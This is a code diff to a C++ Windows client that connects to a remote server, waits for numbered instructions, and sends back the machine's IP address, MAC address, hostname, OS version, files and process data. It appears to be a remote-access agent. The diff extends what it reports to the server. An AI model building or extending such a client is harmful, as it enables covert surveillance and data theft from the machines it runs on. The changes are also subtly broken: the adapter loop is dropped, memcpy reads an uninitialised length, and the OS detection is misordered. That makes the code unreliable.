@@ -28,6 +28,7 @@
 #include <Iphlpapi.h>
 #include <Assert.h>
 #pragma comment(lib, "iphlpapi.lib")
+#pragma warning(disable : 4996)
 
 struct tuple1
 {
@@ -68,30 +69,26 @@ tuple1 getMAC()
     {
         // Contains pointer to current adapter info
         PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
-        do
-        {
             // technically should look at pAdapterInfo->AddressLength
             //   and not assume it is 6.
-            sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
-                    pAdapterInfo->Address[0], pAdapterInfo->Address[1],
-                    pAdapterInfo->Address[2], pAdapterInfo->Address[3],
-                    pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
-            printf("Address: %s, mac: %s\n", pAdapterInfo->IpAddressList.IpAddress.String, mac_addr);
+        sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
+        pAdapterInfo->Address[0], pAdapterInfo->Address[1],
+        pAdapterInfo->Address[2], pAdapterInfo->Address[3],
+        pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
+        printf("Address: %s, mac: %s\n", pAdapterInfo->IpAddressList.IpAddress.String, mac_addr);
 
             //pulls IPs
-            sprintf(ipAddress, "%d.%d.%d.%d",
-                    pAdapterInfo->IpAddressList.IpAddress.String[0], pAdapterInfo->IpAddressList.IpAddress.String[1],
-                    pAdapterInfo->IpAddressList.IpAddress.String[2], pAdapterInfo->IpAddressList.IpAddress.String[3]);
-            printf("Address: %s, mac: %s\n", ipAddress, mac_addr);
+        memcpy(ipAddress, pAdapterInfo->IpAddressList.IpAddress.String, strlen(ipAddress));
+        printf("Address: %s, mac: %s\n", ipAddress, mac_addr);
 
             // print them all, return the last one.
             // return mac_addr;
 
-            printf("\n");
+        printf("\n");
 
-            pAdapterInfo = pAdapterInfo->Next;
-            returnValues = {ipAddress, mac_addr};
-        } while (pAdapterInfo);
+        pAdapterInfo = pAdapterInfo->Next;
+        returnValues = {ipAddress, mac_addr};
+
     }
     free(AdapterInfo);
     return returnValues; // caller must free.
@@ -134,6 +131,25 @@ string PrintProcessNameAndID(DWORD processID)
     ;
     CloseHandle(hProcess);
     return s.str();
+}
+
+std::string getOsName()
+{
+#ifdef _WIN32
+    return "Windows 32-bit";
+#elif _WIN64
+    return "Windows 64-bit";
+#elif __APPLE__ || __MACH__
+    return "Mac OSX";
+#elif __linux__
+    return "Linux";
+#elif __FreeBSD__
+    return "FreeBSD";
+#elif __unix || __unix__
+    return "Unix";
+#else
+    return "Other";
+#endif
 }
 
 int __cdecl main(int argc, char **argv)
@@ -224,12 +240,22 @@ int __cdecl main(int argc, char **argv)
     while (true)
     {
         cout << "\t----------Waiting for instructions---------------" << endl;
-
+        char username[UNLEN + 1];
+        int username_len = UNLEN + 1;
+        gethostname(username, username_len);
         iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
         string rc = string(recvbuf);
+        string OS = getOsName();
         if (rc.find("1") != std::string::npos)
         {
+            
+            OSVERSIONINFOEX info;
+            ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
+            info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+            GetVersionEx((LPOSVERSIONINFO)&info);//info requires typecasting
 
+            printf("Windows version: %u.%u\n", info.dwMajorVersion, info.dwMinorVersion);
+            information.ipAddress += '\000';
             cout << "Sending the information" << endl;
             cout << information.ipAddress << "..." << endl;
             iResult = send(ConnectSocket, information.ipAddress, strlen(information.ipAddress), 0);
@@ -237,6 +263,10 @@ int __cdecl main(int argc, char **argv)
 
             cout << information.macAddress << "..." << endl;
             iResult = send(ConnectSocket, information.macAddress, strlen(information.macAddress), 0);
+
+            cout << username << "..." << endl;
+            iResult = send(ConnectSocket, username, username_len, 0);
+            memset(recvbuf, 0, sizeof recvbuf);
         }
         else if (rc.find("2") != std::string::npos)
         {
@@ -261,6 +291,7 @@ int __cdecl main(int argc, char **argv)
                 iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
                 iResult = send(ConnectSocket, content, fsize, 0);
                 cout << "File sent" << endl;
+                memset(recvbuf, 0, sizeof recvbuf);
             }
             else
             {
@@ -318,6 +349,7 @@ int __cdecl main(int argc, char **argv)
                 // cout<<ie<<"/"<<data.length()<<"--"<<strlen(data.c_str())<<endl;
                 iResult = send(ConnectSocket, temp.c_str(), temp.length(), 0);
                 iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
+                memset(recvbuf, 0, sizeof recvbuf);
 
             }
         }
